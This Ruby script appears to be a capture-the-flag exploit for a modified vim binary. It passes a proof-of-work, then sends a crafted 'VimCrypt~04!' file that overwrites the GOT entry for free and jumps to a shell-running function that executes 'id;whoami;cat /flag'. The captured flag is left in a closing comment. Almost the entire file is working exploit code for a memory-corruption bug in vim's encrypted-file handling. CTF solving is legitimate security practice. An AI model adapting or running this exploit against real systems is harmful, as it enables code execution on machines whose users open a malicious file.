#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')[0]

host, port = '111.186.63.13', 10001
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = './vim'
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
# context.arch = :amd64
# debug!

def pow
  return if @local
  z.gets "sha256(XXXX+"
  c = z.gets(') == ', drop: true)
  a = z.gets.strip
  p [c, a]
  z.puts `./pow #{c} #{a}`.strip
end

pow

cmd = 'id;whoami;cat /flag'

shift = cmd.size + 1 + 8
log.dump shift
buffer = elf.got['free'] + 8 - shift

payload = +"VimCrypt~04!"
iv = 0x61000000 ^ 0xffffffff
payload << p32(iv)
do_shell = 0x45f101

orig_size = 69
size = 71
# 0x{chr}ffffe3 % size = 4 + shift
chr = 256.times.find { |c| ((c << 24)+0xffffe3) % size == shift }
payload << "0BCDEFGHIJKLMNOPQRSTU" + p64(buffer).reverse + p8(chr) + ('ABCDEFGHIJK' + cmd + "\x00" + p64(do_shell)).reverse
log.dump payload.size - 12
# IO.binwrite('/tmp/payload1', payload)
z.puts payload.size
z.write payload
z.interact

# flag{Th4t_st0ry_I_to1d_you_abOut_thE_boy_poet_aNd_th3_girl_poet,_Do_y0u_r3member_thAt?_THAT_WASN'T_TRUE._IT_WAS_SOMETHING_I_JUST_MADE_UP._Isn't_that_the_funniest_thing_you_have_heard?}
